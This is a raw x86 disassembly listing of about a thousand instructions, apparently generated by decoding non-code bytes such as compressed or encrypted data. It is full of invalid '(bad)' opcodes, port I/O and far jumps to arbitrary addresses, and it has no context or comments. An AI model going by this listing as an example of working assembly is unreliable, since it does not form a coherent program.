  41fc2a:	add    cl,BYTE PTR [edx+0x66]
  41fc2d:	retf   
  41fc2e:	mov    ecx,0x30ff7a4a
  41fc33:	adc    BYTE PTR [eax-0x7ace4ad0],al
  41fc39:	ins    DWORD PTR es:[edi],dx
  41fc3a:	and    DWORD PTR [edi+edx*4+0x70068454],esp
  41fc41:	xchg   esp,eax
  41fc42:	fiadd  WORD PTR [edi+0x581f6308]
  41fc48:	retf   
  41fc49:	xor    BYTE PTR [edx+0x3c],0x12
  41fc4d:	fs mov edx,0x68ff4e0a
  41fc53:	or     eax,ebx
  41fc55:	xor    DWORD PTR [ecx+0x301297ed],0x60
  41fc5c:	or     al,BYTE PTR [esi-0x5e]
  41fc5f:	dec    eax
  41fc60:	xor    eax,ebp
  41fc62:	(bad)
  41fc66:	mov    cl,BYTE PTR [ebx+edx*8+0x55bd2550]
  41fc6d:	inc    esi
  41fc6e:	mov    gs,WORD PTR [ebx+0x74f8f8de]
  41fc74:	mov    ah,0x7
  41fc76:	jmp    0x83b7:0x6cbc43d6
  41fc7d:	xchg   edi,eax
  41fc7e:	xchg   ecx,eax
  41fc7f:	gs clc 
  41fc81:	inc    ebx
  41fc82:	in     eax,dx
  41fc83:	xlat   BYTE PTR ds:[ebx]
  41fc84:	add    eax,0x5e10db39
  41fc89:	test   BYTE PTR [eax+ebp*2-0x18],0xe8
  41fc8e:	push   esp
  41fc8f:	imul   eax,DWORD PTR [edi-0xd],0x593dba47
  41fc96:	xor    dh,BYTE PTR ds:0xc386a752
  41fc9c:	jae    0x41fcaa
  41fc9e:	not    BYTE PTR [eax]
  41fca0:	rcr    ch,cl
  41fca2:	push   ss
  41fca3:	test   BYTE PTR [edx+0x5c0ffa15],cl
  41fca9:	loope  0x41fcb4
  41fcab:	sbb    dh,BYTE PTR [eax-0x63]
  41fcae:	add    al,0xd1
  41fcb0:	jle    0x41fc96
  41fcb2:	xchg   esp,eax
  41fcb3:	mov    cl,0x57
  41fcb5:	ja     0x41fcec
  41fcb7:	dec    edi
  41fcb8:	dec    ebx
  41fcb9:	out    dx,eax
  41fcba:	sub    eax,0x477f3b85
  41fcbf:	push   esi
  41fcc0:	in     eax,0x80
  41fcc2:	push   ebp
  41fcc3:	gs inc edx
  41fcc5:	mov    edi,0x986e8d72
  41fcca:	retf   0x7dbd
  41fccd:	or     al,0x4f
  41fccf:	xchg   esp,eax
  41fcd0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fcd1:	ror    bh,cl
  41fcd3:	adc    edi,DWORD PTR [eax-0x27]
  41fcd6:	inc    edx
  41fcd7:	add    BYTE PTR [edi+0x42],0x16
  41fcdb:	sar    BYTE PTR gs:[eax+0x47],0x72
  41fce0:	pop    edi
  41fce1:	outs   dx,DWORD PTR ds:[esi]
  41fce2:	int3   
  41fce3:	jo     0x41fc80
  41fce5:	sti    
  41fce6:	out    dx,al
  41fce7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fce8:	xlat   BYTE PTR ds:[ebx]
  41fce9:	xor    ch,BYTE PTR [esi-0x4b]
  41fcec:	shl    DWORD PTR [edi-0x2e],1
  41fcef:	sub    DWORD PTR [eax],eax
  41fcf1:	push   es
  41fcf2:	gs pop edx
  41fcf4:	sub    esi,DWORD PTR [ebx]
  41fcf6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fcf7:	idiv   BYTE PTR [esi]
  41fcf9:	stos   BYTE PTR es:[edi],al
  41fcfa:	sub    esi,ebp
  41fcfc:	jns    0x41fd67
  41fcfe:	imul   ebx,DWORD PTR [edi-0x7324143c],0xb55c1dbf
  41fd08:	leave  
  41fd09:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fd0a:	lahf   
  41fd0b:	aad    0x9f
  41fd0d:	jmp    0x41fd08
  41fd0f:	lods   al,BYTE PTR ds:[esi]
  41fd10:	xchg   ebp,eax
  41fd11:	imul   edx,ecx,0x10
  41fd14:	jle    0x41fd02
  41fd16:	shl    DWORD PTR [esi-0x4e],cl
  41fd19:	inc    eax
  41fd1a:	out    dx,eax
  41fd1b:	lahf   
  41fd1c:	mov    edi,0xb0617d5b
  41fd21:	jge    0x41fcae
  41fd23:	fiadd  DWORD PTR [ebp-0x55]
  41fd26:	pop    edx
  41fd27:	jb     0x41fd09
  41fd29:	push   0xac62ed16
  41fd2e:	in     eax,0xdf
  41fd30:	xor    DWORD PTR fs:[ecx],esi
  41fd33:	fimul  DWORD PTR [esi]
  41fd35:	jns    0x41fd3f
  41fd37:	jnp    0x41fd36
  41fd39:	xor    al,0x14
  41fd3b:	mov    bh,0x92
  41fd3d:	push   ss
  41fd3e:	shl    BYTE PTR [ebp+0x40057ad0],0x9b
  41fd45:	data16 (bad) 
  41fd47:	mov    eax,ds:0x6e012aeb
  41fd4c:	daa    
  41fd4d:	dec    edx
  41fd4e:	xlat   BYTE PTR ds:[ebx]
  41fd4f:	out    0xba,eax
  41fd51:	xor    BYTE PTR [eax+eiz*1],ch
  41fd54:	xor    DWORD PTR [eax+0x24],ecx
  41fd57:	ss call 0xafadf2e0
  41fd5d:	test   eax,0xdf6076b9
  41fd62:	sbb    ebp,DWORD PTR [esi+0xd]
  41fd65:	xchg   ebp,eax
  41fd66:	in     al,dx
  41fd67:	sti    
  41fd68:	mov    ds:0x1ffa6325,eax
  41fd6d:	xor    al,0x97
  41fd6f:	pusha  
  41fd70:	dec    ecx
  41fd71:	adc    al,0xeb
  41fd73:	(bad)  
  41fd74:	not    DWORD PTR [edi-0x30e09b63]
  41fd7a:	sbb    al,0xc1
  41fd7c:	add    al,0x8d
  41fd7e:	and    eax,0x2717fcbb
  41fd83:	mov    BYTE PTR [edx+ebp*8],0x67
  41fd87:	jne    0x41fdc0
  41fd89:	pop    DWORD PTR [eax]
  41fd8b:	cld    
  41fd8c:	jo     0x41fd1c
  41fd8e:	and    edx,DWORD PTR [edx+0x1808129d]
  41fd94:	int    0x1d
  41fd96:	or     DWORD PTR [eax],esp
  41fd98:	mov    cl,cl
  41fd9a:	mov    edi,0xd6f4e219
  41fd9f:	mov    ch,0x3a
  41fda1:	call   0x1a4f2b98
  41fda6:	cli    
  41fda7:	outs   dx,BYTE PTR ds:[esi]
  41fda8:	pop    edx
  41fda9:	ins    BYTE PTR es:[edi],dx
  41fdaa:	xchg   ebp,eax
  41fdab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fdac:	out    0x23,eax
  41fdae:	cmp    edi,DWORD PTR [esi-0x73]
  41fdb1:	sub    ebp,DWORD PTR [esi+0xd89957a]
  41fdb7:	cmp    al,0xd9
  41fdb9:	jl     0x41fe26
  41fdbb:	shl    DWORD PTR [ebp+0x5127a37f],1
  41fdc1:	out    dx,eax
  41fdc2:	cmp    DWORD PTR [eax],ebx
  41fdc4:	bound  esi,QWORD PTR [eax]
  41fdc6:	or     bl,dh
  41fdc8:	std    
  41fdc9:	mov    esi,0x9156f9f6
  41fdce:	and    eax,0x7065d604
  41fdd3:	push   ss
  41fdd4:	pusha  
  41fdd5:	xchg   esi,eax
  41fdd6:	rol    ah,1
  41fdd8:	sti    
  41fdd9:	arpl   WORD PTR [edi],bx
  41fddb:	mov    ebp,0xf26568d8
  41fde0:	xchg   edi,eax
  41fde1:	aam    0x4c
  41fde3:	lds    ecx,FWORD PTR [edi-0x38e5d346]
  41fde9:	push   ebx
  41fdea:	cmp    BYTE PTR [esi-0x41],bh
  41fded:	dec    edx
  41fdee:	sbb    al,0x3e
  41fdf0:	sub    dh,ah
  41fdf2:	mov    dh,0x34
  41fdf4:	aaa    
  41fdf5:	xor    al,0x2f
  41fdf7:	out    0xf6,eax
  41fdf9:	add    DWORD PTR [eax+0x40],ebx
  41fdfc:	sbb    edi,DWORD PTR [ecx]
  41fdfe:	and    ah,bl
  41fe00:	dec    ecx
  41fe01:	fnstenv [ebx]
  41fe03:	add    DWORD PTR [eax-0x4c],0x7f1bcd32
  41fe0a:	lock scas al,BYTE PTR es:[edi]
  41fe0c:	rcr    DWORD PTR [esi+0x1e],cl
  41fe0f:	adc    bh,bh
  41fe11:	xchg   edx,eax
  41fe13:	mov    eax,0xd29e39f9
  41fe18:	fadd   QWORD PTR [eax]
  41fe1a:	inc    ebp
  41fe1b:	jle    0x41fe1d
  41fe1d:	jno    0x41fe64
  41fe1f:	adc    DWORD PTR [esi+0x7b678416],ecx
  41fe25:	je     0x41fe8c
  41fe27:	pop    ebp
  41fe28:	pusha  
  41fe29:	xor    al,0x5d
  41fe2b:	sahf   
  41fe2c:	inc    edx
  41fe2e:	shl    BYTE PTR [edx+0xa],cl
  41fe31:	push   ebp
  41fe32:	mov    eax,ds:0xb4df2d1d
  41fe37:	mov    ds:0x3a3baaa1,al
  41fe3c:	or     eax,0x1680d5a9
  41fe41:	retf   
  41fe42:	rcl    dl,0x45
  41fe45:	sub    eax,DWORD PTR [esi+0x68]
  41fe48:	mov    ebp,DWORD PTR [edi]
  41fe4a:	xchg   esp,eax
  41fe4b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fe4c:	pop    edx
  41fe4d:	and    esp,esp
  41fe4f:	mov    al,ds:0xa03ca95a
  41fe54:	adc    bh,0xac
  41fe57:	pop    esp
  41fe58:	jge    0x41fe3c
  41fe5a:	or     ecx,DWORD PTR [esi-0x1b616b11]
  41fe60:	cmp    BYTE PTR [esi],cl
  41fe62:	and    al,0x9
  41fe64:	mov    ecx,0xbcefaf21
  41fe69:	js     0x41fee1
  41fe6b:	pop    edi
  41fe6c:	xchg   DWORD PTR [ecx-0x32becca6],edi
  41fe72:	mov    ah,al
  41fe74:	mov    ecx,edx
  41fe76:	dec    eax
  41fe77:	inc    edi
  41fe78:	bndmk  bnd0,[esi+0x48d83026]
  41fe80:	fs aas 
  41fe82:	push   ebp
  41fe83:	mov    cl,0xde
  41fe85:	push   eax
  41fe86:	push   edi
  41fe87:	pop    ecx
  41fe88:	call   0xce27:0x8cdedf0c
  41fe8f:	and    DWORD PTR [edi-0x10],esi
  41fe92:	mov    dl,0xdc
  41fe94:	sbb    BYTE PTR [edi+0x15ba0f44],0x77
  41fe9b:	ret    0xc2c1
  41fe9e:	mov    dh,0x9e
  41fea0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fea1:	imul   ebx,DWORD PTR [ebp+edi*2+0x1c85b4c5],0xffffffa6
  41fea9:	out    dx,eax
  41feaa:	mov    bl,0x7f
  41feac:	imul   ebp,DWORD PTR [edi],0xd67c66a6
  41feb2:	retf   
  41feb3:	xchg   esp,eax
  41feb4:	inc    esp
  41feb5:	push   edx
  41feb6:	(bad)  
  41feb7:	cmp    DWORD PTR [ebp+0x44],eax
  41feba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41febb:	sub    BYTE PTR [eax],ah
  41febd:	stos   DWORD PTR es:[edi],eax
  41febe:	push   edi
  41febf:	mov    BYTE PTR [esi],0xee
  41fec2:	sub    al,0x5a
  41fec4:	into   
  41fec5:	ret    0xa881
  41fec8:	push   ds
  41fec9:	popa   
  41feca:	(bad)
  41fece:	cli    
  41fecf:	fbstp  TBYTE PTR [ebp+0x3a]
  41fed2:	cmp    esi,DWORD PTR [eax-0x18]
  41fed5:	mov    ds:0x422c8047,al
  41feda:	mov    eax,ds:0xb355ad61
  41fedf:	ret    0x8001
  41fee2:	jmp    0x583bee8e
  41fee7:	and    ebx,DWORD PTR ds:0xbe9ffee9
  41feed:	fld    QWORD PTR [edi+0xa]
  41fef0:	dec    esi
  41fef1:	das    
  41fef2:	add    al,0x36
  41fef4:	bound  edx,QWORD PTR [edx+0x6a9f8e9b]
  41fefa:	fild   DWORD PTR [esp+eiz*4+0x1b]
  41fefe:	aam    0x1
  41ff00:	adc    eax,0x7f14edb1
  41ff05:	les    ebx,FWORD PTR [eax+0x291b7e9d]
  41ff0b:	or     ecx,DWORD PTR [ebx+eiz*4]
  41ff0e:	ins    BYTE PTR es:[edi],dx
  41ff0f:	pop    ss
  41ff10:	sbb    al,0x9a
  41ff12:	jmp    0xc8ba:0x6493be03
  41ff19:	dec    esi
  41ff1a:	sub    edi,DWORD PTR [ecx-0x70f1b7c0]
  41ff20:	clc    
  41ff21:	retf   
  41ff22:	lock pop esi
  41ff24:	xchg   BYTE PTR [edx-0x6844d850],cl
  41ff2a:	mov    cl,0x1d
  41ff2c:	cs lahf 
  41ff2e:	(bad)  
  41ff2f:	out    dx,eax
  41ff30:	cmp    al,0x61
  41ff32:	mov    ds:0x1a96c0b,eax
  41ff37:	clc    
  41ff38:	mov    ?,eax
  41ff3a:	leave  
  41ff3b:	sub    esi,DWORD PTR [esi]
  41ff3d:	mov    esp,0xb2e8c645
  41ff42:	xchg   esi,eax
  41ff43:	sbb    BYTE PTR [ecx],bh
  41ff45:	test   BYTE PTR [ebx],dl
  41ff47:	rol    BYTE PTR [edi],0x47
  41ff4a:	jae    0x41ff33
  41ff4c:	mov    ds:0xce421d41,al
  41ff51:	or     eax,0x2bb32fd2
  41ff56:	sbb    dl,BYTE PTR [edx+0x54]
  41ff59:	xor    esi,DWORD PTR [ebp+0x17009460]
  41ff5f:	and    eax,0xe60dfc5a
  41ff64:	mov    ds:0x50e3282d,eax
  41ff69:	mov    ds:0x563bbbf5,al
  41ff6e:	fwait
  41ff6f:	sub    BYTE PTR [edi+0x4193df92],cl
  41ff75:	push   edx
  41ff76:	inc    eax
  41ff77:	icebp  
  41ff78:	fwait
  41ff79:	scas   al,BYTE PTR es:[edi]
  41ff7a:	scas   eax,DWORD PTR es:[edi]
  41ff7b:	cmp    DWORD PTR [esi+0x4c],esp
  41ff7e:	(bad)  
  41ff7f:	mov    ebx,0x46530fa7
  41ff84:	mov    ebp,fs
  41ff86:	push   es
  41ff87:	cmp    bh,ah
  41ff89:	xor    DWORD PTR [edx-0x37],0x0
  41ff8d:	cmp    bl,BYTE PTR [eax+0x65]
  41ff90:	push   esi
  41ff91:	ins    DWORD PTR es:[edi],dx
  41ff92:	dec    edi
  41ff93:	sahf   
  41ff94:	mov    ds:0x6682ab9b,al
  41ff99:	nop
  41ff9a:	adc    edx,DWORD PTR [ebp+0x2b48bf27]
  41ffa0:	sbb    eax,0x20cdbced
  41ffa5:	int3   
  41ffa6:	xor    eax,0xd25247b7
  41ffab:	dec    ebx
  41ffac:	dec    edx
  41ffad:	clc    
  41ffae:	hlt    
  41ffaf:	push   ss
  41ffb0:	push   esi
  41ffb1:	mov    ch,0x34
  41ffb3:	shl    DWORD PTR [ebp-0x19d59fb7],cl
  41ffb9:	mov    dl,0x24
  41ffbb:	test   al,0x36
  41ffbd:	scas   al,BYTE PTR es:[edi]
  41ffbe:	sar    cl,cl
  41ffc0:	mov    bh,0x6e
  41ffc2:	push   edx
  41ffc3:	cmp    DWORD PTR ds:0x64d0944b,edi
  41ffc9:	fstp   TBYTE PTR [ebp+0x70]
  41ffcc:	outs   dx,DWORD PTR ds:[esi]
  41ffcd:	add    ebx,DWORD PTR [ebx-0x6b5fb6d]
  41ffd3:	jmp    ebx
  41ffd5:	and    DWORD PTR [ebp*2+0x5312a983],ebx
  41ffdc:	int3   
  41ffdd:	outs   dx,BYTE PTR ds:[esi]
  41ffde:	jne    0x420059
  41ffe0:	icebp  
  41ffe1:	lods   al,BYTE PTR ds:[esi]
  41ffe2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ffe3:	and    ebp,edi
  41ffe5:	(bad)  
  41ffe6:	les    esp,FWORD PTR [ebp-0x80]
  41ffe9:	pop    es
  41ffea:	int    0xec
  41ffec:	test   BYTE PTR [esp+ecx*2],al
  41ffef:	popf   
  41fff0:	and    dl,BYTE PTR [ecx]
  41fff2:	jecxz  0x41ffde
  41fff4:	mov    BYTE PTR [eax-0x34],dh
  41fff7:	push   edi
  41fff8:	rol    DWORD PTR [ebx],1
  41fffa:	jmp    0x9da8b1dc
  41ffff:	and    edi,eax
  420001:	sar    BYTE PTR [edx],1
  420003:	call   0x9ed9:0xe44b9091
  42000a:	outs   dx,BYTE PTR ds:[esi]
  42000b:	adc    eax,0xa0ea1f16
  420010:	stos   BYTE PTR es:[edi],al
  420011:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420012:	and    ah,BYTE PTR [ebp+0x303fa55d]
  420018:	cdq    
  420019:	fidiv  WORD PTR [esi+0x21e63e7a]
  42001f:	popf   
  420020:	pop    edx
  420021:	lods   al,BYTE PTR ds:[esi]
  420022:	sub    al,0xed
  420024:	mov    ebp,DWORD PTR [esi]
  420026:	cdq    
  420027:	and    bl,ah
  420029:	aas    
  42002a:	test   eax,0x50f01fd2
  42002f:	fnsave [edi+0x569382fa]
  420035:	jae    0x42003a
  420037:	loopne 0x41fff2
  420039:	push   ebp
  42003a:	fsubr  QWORD PTR [edi+0x47]
  42003d:	(bad)  
  42003e:	ss push 0xffffffbb
  420041:	mov    bl,0x5e
  420043:	pop    es
  420044:	retf   
  420045:	add    eax,0x1b2a5656
  42004a:	mov    eax,ds:0x37588a05
  42004f:	xchg   esi,eax
  420050:	and    eax,0x95bfa865
  420055:	dec    ebp
  420056:	and    bl,BYTE PTR [ebx]
  420058:	dec    esi
  420059:	mov    BYTE PTR [ebx],cl
  42005b:	jmp    0xa2c39e
  420060:	push   cs
  420061:	push   eax
  420062:	xchg   ebx,eax
  420063:	and    BYTE PTR ds:0xb8eff5ca,0x5d
  42006a:	popf   
  42006b:	push   ss
  42006c:	mov    al,ds:0x8d902f98
  420071:	push   cs
  420072:	push   esp
  420073:	inc    DWORD PTR [ebp-0x5c2ea38f]
  420079:	xor    al,0xd5
  42007b:	shr    DWORD PTR [ebp+0x3c],cl
  42007e:	inc    ebp
  42007f:	sub    BYTE PTR [ebp+0x7f],cl
  420082:	push   ds
  420083:	add    bl,BYTE PTR [ebx+0x3d650219]
  420089:	les    edx,FWORD PTR [bx]
  42008c:	push   ss
  42008d:	mov    edx,0xb1d93d5a
  420092:	mov    ah,0x67
  420094:	out    0xb3,eax
  420096:	mov    fs,edx
  420098:	sub    BYTE PTR [ebx-0x27],ah
  42009b:	push   0x6a
  42009d:	sbb    eax,0x19dcf2db
  4200a2:	cdq    
  4200a3:	pop    edi
  4200a4:	js     0x42006f
  4200a6:	cmp    BYTE PTR [esp+esi*1],cl
  4200a9:	fimul  DWORD PTR [ebx]
  4200ab:	mov    edx,0x64050ad3
  4200b0:	sub    DWORD PTR [edx-0x722ce37f],ebx
  4200b6:	rcr    cl,cl
  4200b8:	mov    BYTE PTR [eax+ebp*8],0xc3
  4200bc:	jo     0x420121
  4200be:	inc    ebp
  4200bf:	stos   BYTE PTR es:[edi],al
  4200c0:	sbb    ecx,DWORD PTR [eax-0xe]
  4200c3:	jge    0x42013f
  4200c5:	out    dx,al
  4200c6:	adc    bh,al
  4200c8:	and    DWORD PTR [esp+esi*1+0x2947fe38],edi
  4200cf:	icebp  
  4200d0:	mov    WORD PTR [eax+0x2bcdf310],?
  4200d6:	pop    ss
  4200d7:	jne    0x42014a
  4200d9:	or     BYTE PTR [edx+0x5974c11a],ch
  4200df:	daa    
  4200e0:	xchg   ebp,eax
  4200e1:	pop    esp
  4200e2:	pusha  
  4200e3:	cmp    cx,bp
  4200e6:	daa    
  4200e7:	(bad)  
  4200e8:	mov    BYTE PTR [esi+edx*8-0x6d5e631b],dl
  4200ef:	and    al,0x74
  4200f1:	xchg   ecx,eax
  4200f2:	iret   
  4200f3:	(bad)  
  4200f4:	psubsw mm3,mm2
  4200f7:	jnp    0x420111
  4200f9:	inc    eax
  4200fa:	pop    esp
  4200fb:	out    0x48,eax
  4200fd:	fbld   TBYTE PTR [eax+0x60ff4546]
  420103:	cmp    esi,DWORD PTR [ebx-0x34af882a]
  420109:	xor    DWORD PTR [ecx+eiz*2+0x58403bf5],ecx
  420110:	push   esi
  420111:	sub    edx,DWORD PTR [edi-0x48e6228f]
  420117:	fldcw  WORD PTR [edx-0x2aeda1d9]
  42011d:	ficomp DWORD PTR [ecx-0x6ad21cd3]
  420123:	in     eax,dx
  420124:	jl     0x4200c0
  420126:	or     DWORD PTR [esi],esi
  420128:	rol    BYTE PTR [edi+0x5f],0x10
  42012c:	mov    cl,0x5e
  42012e:	jne    0x42013b
  420130:	neg    BYTE PTR [ebp+0x504306bb]
  420136:	jg     0x420128
  420138:	inc    ah
  42013a:	in     al,dx
  42013b:	ds ja  0x420193
  42013e:	bound  edi,QWORD PTR [ebp+0x60]
  420141:	push   esp
  420142:	lods   al,BYTE PTR ds:[esi]
  420143:	test   BYTE PTR [ebp+0x5c4c082e],ch
  420149:	ret    0x8ea8
  42014c:	push   es
  42014d:	loop   0x420189
  42014f:	hlt    
  420150:	inc    ebx
  420151:	out    dx,al
  420152:	imul   ecx,DWORD PTR [eax+0x4b0ab856],0xf4b97b51
  42015c:	mov    ebx,0xf3b7ba4e
  420161:	loopne 0x4200fc
  420163:	xor    eax,0x219c9e26
  420168:	fild   WORD PTR [ecx+0x65]
  42016b:	mov    dl,0x55
  42016d:	fmul   QWORD PTR [edx]
  42016f:	mov    ebx,0x91643c
  420174:	mov    eax,ds:0xa20f1be3
  420179:	sti    
  42017a:	stc    
  42017b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42017c:	push   esp
  42017d:	(bad)  
  42017e:	pop    es
  42017f:	test   al,0x89
  420181:	mov    cl,0xc
  420183:	call   0x634393b2
  420188:	jbe    0x42010e
  42018a:	jno    0x42010e
  42018c:	push   cs
  42018d:	jmp    0x42013a
  42018f:	and    eax,0x93741ea
  420194:	push   0x53
  420196:	pop    ecx
  420197:	push   ebx
  420198:	mov    ah,0xf9
  42019a:	int3   
  42019b:	loopne 0x42013a
  42019d:	pop    esp
  42019e:	pop    edx
  42019f:	lahf   
  4201a0:	mov    eax,0x886efeb
  4201a5:	cwde   
  4201a6:	jb     0x420163
  4201a8:	fbstp  TBYTE PTR [eax+0x39e708fb]
  4201ae:	data16 jmp 0x4201df
  4201b1:	js     0x42019e
  4201b3:	jo     0x42015c
  4201b5:	ror    edi,0x43
  4201b8:	ret    
  4201b9:	loop   0x4201ba
  4201bb:	test   eax,0xed023990
  4201c0:	aaa    
  4201c1:	test   BYTE PTR [edi+ecx*1-0x3f9393d8],al
  4201c8:	pusha  
  4201c9:	pusha  
  4201ca:	adc    eax,0xa29fb561
  4201cf:	mov    eax,ds:0x625348ad
  4201d4:	mov    al,BYTE PTR ds:[eax]
  4201d7:	or     DWORD PTR [edi+0x2377b7eb],ebp
  4201dd:	or     BYTE PTR [esi-0x52928dd4],bl
  4201e3:	pushf  
  4201e4:	cmp    eax,0x1a7609db
  4201e9:	add    dl,BYTE PTR [esi]
  4201eb:	jnp    0x4201af
  4201ed:	jbe    0x420254
  4201ef:	mov    bh,0x49
  4201f1:	pop    edx
  4201f2:	jnp    0x4201cf
  4201f4:	pop    es
  4201f5:	cwde   
  4201f6:	mov    ds:0x2d7be779,al
  4201fb:	sahf   
  4201fc:	xor    DWORD PTR [edx],0xcf405c1b
  420202:	xchg   ecx,eax
  420203:	inc    esi
  420204:	pop    edx
  420205:	adc    DWORD PTR [eax-0x6f3b6928],0x6f
  42020c:	outs   dx,DWORD PTR ds:[esi]
  42020d:	mov    esp,0xbfde435
  420212:	enter  0x3b64,0x58
  420216:	pop    edx
  420217:	xchg   edx,eax
  420218:	je     0x420278
  42021a:	(bad)  
  42021b:	mov    ecx,edx
  42021d:	cmp    bl,ah
  42021f:	adc    edi,DWORD PTR [ecx-0x56993bbf]
  420225:	or     al,0x6d
  420227:	sub    DWORD PTR [ebp+esi*2-0x4dcee4dc],0x26
  42022f:	mov    dl,0xe6
  420231:	daa    
  420232:	pop    ss
  420233:	mov    cl,0x6e
  420235:	sbb    al,0x38
  420237:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420238:	mov    al,ds:0x1600f77
  42023d:	mov    esi,0xbf176ab2
  420242:	jg     0x4201e7
  420244:	xchg   ebx,eax
  420245:	push   edi
  420246:	stos   DWORD PTR es:[edi],eax
  420247:	or     BYTE PTR [esi],bl
  420249:	push   ss
  42024a:	mov    eax,ds:0x4b596031
  42024f:	push   ecx
  420250:	fdivp  st(1),st
  420252:	mov    ah,0x3d
  420254:	xor    eax,0x632bc60c
  420259:	jns    0x420201
  42025b:	mov    ds:0xecceb166,al
  420260:	push   ds
  420261:	jne    0x4201ea
  420263:	jnp    0x42020f
  420265:	cmc    
  420266:	xor    BYTE PTR ds:0x5f1a7b81,al
  42026c:	lahf   
  42026d:	mov    esi,0x7e15186f
  420272:	add    dl,dl
  420274:	xchg   ebx,eax
  420275:	aam    0xec
  420277:	ins    DWORD PTR es:[edi],dx
  420278:	xchg   edx,eax
  420279:	cwde   
  42027a:	ret    
  42027b:	mov    ch,0x45
  42027e:	xlat   BYTE PTR ds:[ebx]
  42027f:	stc    
  420280:	sar    BYTE PTR [edx+eax*4-0x7334af4f],0xdd
  420288:	sbb    eax,0xc76baf6f
  42028d:	ins    BYTE PTR es:[edi],dx
  42028e:	add    ecx,ebp
  420290:	add    cl,BYTE PTR [esi+0x65]
  420293:	sbb    al,0xe6
  420295:	xchg   edx,eax
  420296:	test   DWORD PTR [edx+edi*2+0x2f],ebp
  42029a:	sub    BYTE PTR [edx+eax*1],al
  42029d:	jle    0x42030d
  42029f:	iret   
  4202a0:	pop    eax
  4202a1:	xchg   esp,eax
  4202a2:	jmp    0x254edeac
  4202a7:	stos   DWORD PTR es:[edi],eax
  4202a8:	xor    al,BYTE PTR [ebx]
  4202aa:	js     0x4202bd
  4202ac:	or     eax,0x5908a60b
  4202b1:	push   eax
  4202b2:	stos   DWORD PTR es:[edi],eax
  4202b3:	push   ecx
  4202b4:	outs   dx,DWORD PTR ds:[esi]
  4202b5:	nop
  4202b6:	push   ebp
  4202b7:	es inc ecx
  4202b9:	sub    al,0x1d
  4202bb:	es stos BYTE PTR es:[edi],al
  4202bd:	and    edi,DWORD PTR [ebx-0x20]
  4202c0:	sbb    esi,DWORD PTR [esi]
  4202c2:	mov    dl,BYTE PTR [edi-0x6b8c120b]
  4202c8:	mov    ebx,0xfd833398
  4202cd:	push   ebp
  4202ce:	pop    ebx
  4202cf:	pop    ebp
  4202d0:	call   0x5ac6:0x3ea1ddc9
  4202d7:	addr16 mov al,0x86
  4202da:	in     eax,dx
  4202db:	fadd   st,st(5)
  4202dd:	(bad)  [eax-0x63aa4c6e]
  4202e3:	pop    eax
  4202e4:	les    esp,FWORD PTR [edx]
  4202e6:	jnp    0x420357
  4202e8:	daa    
  4202e9:	jae    0x420356
  4202eb:	dec    eax
  4202ec:	inc    esp
  4202ed:	add    eax,0x62139d69
  4202f2:	dec    ebp
  4202f3:	fs ret 
  4202f5:	aas    
  4202f6:	rcl    DWORD PTR [eax+0xa],1
  4202f9:	mov    edi,ss
  4202fb:	push   cs
  4202fc:	ss push eax
  4202fe:	jb     0x4202e5
  420300:	fcom   st(5)
  420302:	clc    
  420303:	aam    0x9
  420305:	xchg   ecx,eax
  420306:	sub    DWORD PTR [esi+0x58],ebx
  420309:	pop    ebp
  42030a:	fs cmp esi,eax
  42030d:	popf   
  42030e:	cwde   
  42030f:	cwde   
  420310:	imul   edx,DWORD PTR [eax+0x5e],0xf
  420314:	cld    
  420315:	test   al,0x93
  420317:	mov    ds:0x4d07259,al
  42031c:	jne    0x4202bd
  42031e:	pusha  
  42031f:	scas   eax,DWORD PTR es:[edi]
  420320:	inc    ebx
  420321:	ror    DWORD PTR [ebp-0x63],1
  420324:	repnz inc esi
  420326:	out    0x6c,al
  420328:	jmp    0xa02c:0x98c664b7
  42032f:	in     eax,dx
  420330:	sbb    eax,0xa520f46b
  420335:	sbb    al,0x72
  420337:	(bad)  
  420338:	cmp    al,0x33
  42033a:	push   ebx
  42033b:	pop    esp
  42033c:	mov    esi,0x24d95495
  420341:	nop    DWORD PTR [ebx+eiz*4+0x7d]
  420346:	adc    ebx,DWORD PTR [ebx+eax*2-0x2]
  42034a:	push   cs
  42034b:	outs   dx,BYTE PTR ds:[esi]
  42034c:	inc    ecx
  42034d:	aaa    
  42034e:	ss repz jmp 0x8484a607
  420355:	dec    ebx
  420356:	icebp  
  420357:	test   al,0xc3
  420359:	cmc    
  42035a:	adc    edi,DWORD PTR [esi+eiz*4]
  42035d:	ds mov al,0x9
  420360:	mov    dl,0x1a
  420362:	fwait
  420363:	lods   al,BYTE PTR ds:[esi]
  420364:	ins    DWORD PTR es:[edi],dx
  420365:	(bad)  
  420366:	ins    BYTE PTR es:[edi],dx
  420367:	(bad)  
  420368:	jmp    0xe03:0xdb694eed
  42036f:	mov    eax,ds:0x38b17155
  420374:	repnz cmp BYTE PTR [edi+ecx*2+0x643841fb],0xaa
  42037d:	mov    DWORD PTR [eax+0x5],ebx
  420380:	mov    al,0xe8
  420382:	std    
  420383:	iret   
  420384:	test   al,0xb1
  420386:	lock adc esp,DWORD PTR [ebp+0x78]
  42038a:	inc    ebx
  42038b:	(bad)  
  42038c:	call   0xc07d5334
  420391:	add    edi,esp
  420393:	stos   BYTE PTR es:[edi],al
  420394:	xor    DWORD PTR [eax+esi*1],esp
  420397:	dec    ebx
  420398:	ret    
  420399:	inc    edi
  42039a:	dec    esp
  42039b:	stos   DWORD PTR es:[edi],eax
  42039c:	pop    ss
  42039d:	sub    ebp,DWORD PTR [edi]
  42039f:	fwait
  4203a0:	push   edi
  4203a1:	and    bh,bh
  4203a3:	mov    esp,0xe3ed0e69
  4203a8:	ds mov bl,0x40
  4203ab:	push   eax
  4203ac:	enter  0xb57f,0x23
  4203b0:	popa   
  4203b1:	cmp    DWORD PTR [esi-0x2f],edx
  4203b4:	sub    eax,0xf3dbbd85
